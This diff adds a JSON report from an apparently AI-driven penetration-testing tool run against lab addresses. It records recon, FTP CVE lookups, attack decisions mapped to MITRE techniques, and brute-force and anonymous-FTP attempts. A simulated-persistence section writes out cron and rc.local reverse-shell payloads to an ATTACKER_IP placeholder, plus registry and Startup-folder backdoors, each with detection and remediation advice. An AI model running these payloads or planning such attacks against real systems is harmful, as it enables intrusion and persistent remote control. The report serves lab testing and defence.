@@ -1,0 +1,272 @@
+{
+  "target": "192.168.56.182",
+  "recon": {
+    "dns": {
+      "A": [],
+      "MX": [],
+      "NS": [],
+      "TXT": []
+    },
+    "whois": {
+      "registrar": null,
+      "creation_date": null,
+      "expiration_date": null,
+      "emails": "abuse@iana.org",
+      "org": null
+    },
+    "subdomains": [],
+    "shodan": {},
+    "timestamp": "2026-02-20T21:22:23.237392"
+  },
+  "scan_results": {
+    "21": {
+      "service": "ftp",
+      "version": "",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-0082",
+          "description": "CWD ~root command in ftpd allows root access.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-1090",
+          "description": "The default configuration of NCSA Telnet package for Macintosh and PC enables FTP, even though it does not include an \"ftp=yes\" line, which allows remote attackers to read and modify arbitrary files.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-1119",
+          "description": "FTP installation script anon.ftp in AIX insecurely configures anonymous FTP, which allows remote attackers to execute arbitrary commands.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0080",
+          "description": "Certain configurations of wu-ftp FTP server 2.4 use a _PATH_EXECPATH setting to a directory with dangerous commands, such as /bin, which allows remote authenticated users to gain root access via the \"site exec\" command.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0201",
+          "description": "A quote cwd command on FTP servers can reveal the full path of the home directory of the \"ftp\" user.",
+          "cvss_score": 6.4
+        }
+      ]
+    }
+  },
+  "ai_decisions": [
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1200",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "High CVSS scores for multiple CVEs",
+      "priority": 1
+    },
+    {
+      "technique": "ftp_anon",
+      "mitre_id": "T1190",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "Potential for anonymous access",
+      "priority": 2
+    },
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1200",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "Exploitation of CVE-1999-0082 for root access",
+      "priority": 3
+    },
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1200",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "Exploitation of CVE-1999-1119 for arbitrary command execution",
+      "priority": 4
+    },
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1200",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "Exploitation of CVE-1999-0080 for root access",
+      "priority": 5
+    }
+  ],
+  "exploit_results": [
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T14:50:38.080132"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T14:50:38.189231"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T14:50:38.241045"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T15:15:08.668898"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:15:09.852048"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:15:11.249871"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:24:28.633002"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:24:28.704049"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T15:24:50.012239"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "10.129.2.252",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T19:17:29.349911"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "10.129.2.252",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T19:17:32.016938"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "10.129.2.252",
+      "port": 21,
+      "success": false,
+      "result": "530 Login incorrect.",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T19:17:35.883662"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.182",
+      "port": 21,
+      "success": false,
+      "result": "timed out",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T21:27:34.671948"
+    }
+  ],
+  "privesc_results": {
+    "message": "No SSH session available. Privesc checks require a valid session.",
+    "suid_binaries": [],
+    "sudo_misconfig": [],
+    "cron_jobs": [],
+    "writable_configs": []
+  },
+  "persistence_simulated": [
+    {
+      "technique": "Cron Job Persistence",
+      "mitre_id": "T1053.003",
+      "simulated": true,
+      "payload_string": "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+      "target_file": "/etc/crontab",
+      "detection": "Monitor /etc/crontab for unauthorized modifications",
+      "remediation": "Audit cron jobs weekly. Use cron.allow/deny restrictions.",
+      "timestamp": "2026-02-20T15:57:34.796960"
+    },
+    {
+      "technique": "RC.local Startup Script",
+      "mitre_id": "T1037.004",
+      "simulated": true,
+      "payload_string": "#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\nexit 0",
+      "target_file": "/etc/rc.local",
+      "detection": "Monitor /etc/rc.local for unauthorized changes; check file integrity with AIDE/Tripwire.",
+      "remediation": "Disable rc.local execution or restrict write access. Use systemd service hardening.",
+      "timestamp": "2026-02-20T15:57:34.796977"
+    },
+    {
+      "technique": "Registry Run Key",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"cmd.exe\"",
+      "target_file": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "detection": "Monitor registry Run/RunOnce keys for new or modified values using Sysmon (Event ID 13).",
+      "remediation": "Restrict registry write access. Deploy endpoint detection (EDR) with Run-key monitoring.",
+      "timestamp": "2026-02-20T15:57:34.796981"
+    },
+    {
+      "technique": "Startup Folder",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "copy backdoor.exe \"C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\"",
+      "target_file": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+      "detection": "Monitor Startup folder contents for new executables; use Autoruns for auditing.",
+      "remediation": "Restrict write access to Startup folders. Use AppLocker / WDAC to block unsigned executables.",
+      "timestamp": "2026-02-20T15:57:34.796984"
+    }
+  ],
+  "session_info": {
+    "technique": "ftp_anon",
+    "port": 21,
+    "target": "192.168.56.102"
+  },
+  "report_generated": "2026-02-20T21:27:40.030665"
+}
